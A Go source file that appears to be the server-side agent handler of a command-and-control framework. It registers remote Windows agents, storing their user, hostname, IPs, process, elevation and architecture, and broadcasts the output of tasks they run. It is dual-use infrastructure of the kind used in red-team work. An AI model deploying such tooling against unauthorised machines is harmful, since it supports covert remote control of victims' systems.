package server

import (
	"bytes"
	"encoding/json"
	"fmt"

	"github.com/z3vxo/kronos/internal/broker"
	"github.com/z3vxo/kronos/internal/bytemgr"
	"github.com/z3vxo/kronos/internal/database"
)

type AgentHandler struct {
	DB     *database.DB
	Broker *broker.Broker
	Host   string
}

func ConvertToWindowsVer(major, minor, build int32) string {
	switch {
	case major == 10 && minor == 0 && build > 22000:
		return fmt.Sprintf("Windows 11 (Build %d)", build)
	case major == 10 && minor == 0:
		return fmt.Sprintf("Windows 10 (Build %d)", build)
	case major == 6 && minor == 3:
		return "Windows  8.1"
	case major == 6 && minor == 2:
		return "Windows 8"
	case major == 6 && minor == 1:
		return "Windows 7"
	case major == 6 && minor == 0:
		return "Windows Vista"
	case major == 5 && minor == 2:
		return "Windows XP (64-bit) / Server 2003"
	case major == 5 && minor == 1:
		return "Windows XP"
	case major == 5 && minor == 0:
		return "Windows 2000"
	default:
		return fmt.Sprintf("Unknwon Windows (%d.%d.%d)", major, minor, build)

	}
}

type UserDetails struct {
	CodeName   string `json:"code_name"`
	Username   string `json:"username"`
	HostName   string `json:"hostname"`
	IsElevated bool   `json:"is_elevated"`
}

type DataDetails struct {
	AgentID string `json:"agent_id"`
	TaskID  int32  `json:"task_id"`
	Output  string `json:"output"`
}

type Event struct {
	CmdType int         `json:"type"`
	User    UserDetails `json:"user"`
	Data    DataDetails `json:"data"`
}

func (h *AgentHandler) HandleClientRegister(ip string, r *bytes.Reader) error {
	Client, err := bytemgr.ExtractRegistrationDetails(ip, r)
	if err != nil {
		fmt.Println(err)
		return err
	}

	ver := ConvertToWindowsVer(Client.Major, Client.Minor, Client.Build)
	CodeName := GenCodeName()
	err = h.DB.InsertAgent(Client.Guid, CodeName,
		Client.User, Client.Host,
		Client.InternaIP, Client.ExternalIP,
		Client.ProcPath, ver, Client.Pid, Client.Ppid, Client.IsElev, Client.Arch)
	if err != nil {
		return err
	}

	data, err := json.Marshal(Event{
		CmdType: 1,
		User: UserDetails{
			CodeName: CodeName,
			Username: Client.User,
			HostName: Client.Host,
		},
		Data: DataDetails{},
	})
	if err == nil {
		h.Broker.Broadcast(string(data))
	}

	return nil

}

func (h *AgentHandler) HandleAgentOutput(r *bytes.Reader, id string) {
	OutputEntrys, err := bytemgr.ParseClientOutput(r)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(len(OutputEntrys))

	for _, o := range OutputEntrys {
		data, err := json.Marshal(Event{
			CmdType: 2,
			Data: DataDetails{
				AgentID: id,
				TaskID:  o.TaskID,
				Output:  string(o.Output),
			},
		})
		if err != nil {
			fmt.Println(err)
			return
		}
		h.Broker.Broadcast(string(data))
	}
}
